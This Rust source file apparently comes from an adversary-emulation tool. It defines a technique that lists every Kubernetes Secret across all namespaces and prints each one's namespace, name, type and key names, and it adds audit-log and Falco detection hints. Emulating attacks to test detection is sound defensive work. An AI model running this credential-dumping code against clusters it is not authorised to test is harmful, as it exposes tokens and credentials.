use std::collections::HashMap;
use std::sync::Arc;
use anyhow::Result;
use kube::{Api, Client};
use k8s_openapi::api::core::v1::Secret;

use crate::platform::Platform;
use crate::providers::CloudProviders;
use crate::tactic::MitreTactic;
use crate::technique::{AttackTechnique, BoxFuture};

async fn detonate_impl(
    _outputs: HashMap<String, String>,
    _providers: Arc<CloudProviders>,
) -> Result<()> {
    let client = Client::try_default()
        .await
        .map_err(|e| anyhow::anyhow!("Failed to create Kubernetes client: {}. Ensure KUBECONFIG is set or running in a cluster.", e))?;

    // List secrets across all namespaces
    let secrets: Api<Secret> = Api::all(client);
    let secret_list = secrets
        .list(&Default::default())
        .await
        .map_err(|e| anyhow::anyhow!("Failed to list secrets: {}", e))?;

    let total = secret_list.items.len();
    println!(
        "Dumped {} Kubernetes Secret(s) across all namespaces:",
        total
    );

    for secret in &secret_list.items {
        let ns = secret
            .metadata
            .namespace
            .as_deref()
            .unwrap_or("default");
        let name = secret
            .metadata
            .name
            .as_deref()
            .unwrap_or("<unnamed>");
        let secret_type = secret.type_.as_deref().unwrap_or("Opaque");
        let data_keys: Vec<&str> = secret
            .data
            .as_ref()
            .map(|d| d.keys().map(|k| k.as_str()).collect())
            .unwrap_or_default();

        println!(
            "  [{}/{}] type={} keys=[{}]",
            ns,
            name,
            secret_type,
            data_keys.join(", ")
        );
    }

    println!("Total secrets dumped: {}", total);
    Ok(())
}

fn detonate(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> BoxFuture<Result<()>> {
    Box::pin(detonate_impl(outputs, providers))
}

inventory::submit! {
    AttackTechnique {
        id: "k8s.credential-access.dump-secrets",
        friendly_name: "Dump All Kubernetes Secrets",
        description: "Lists and dumps all Kubernetes Secret objects across all namespaces, potentially exposing service account tokens, TLS certificates, and application credentials.",
        detection: "Kubernetes audit log: list secrets across namespaces by unexpected identity. Falco rule: Read secrets in cluster.",
        platform: Platform::Kubernetes,
        mitre_tactics: &[MitreTactic::CredentialAccess],
        is_idempotent: true,
        is_slow: false,
        prerequisite_tf: None,
        detonate,
        revert: None,
    }
}
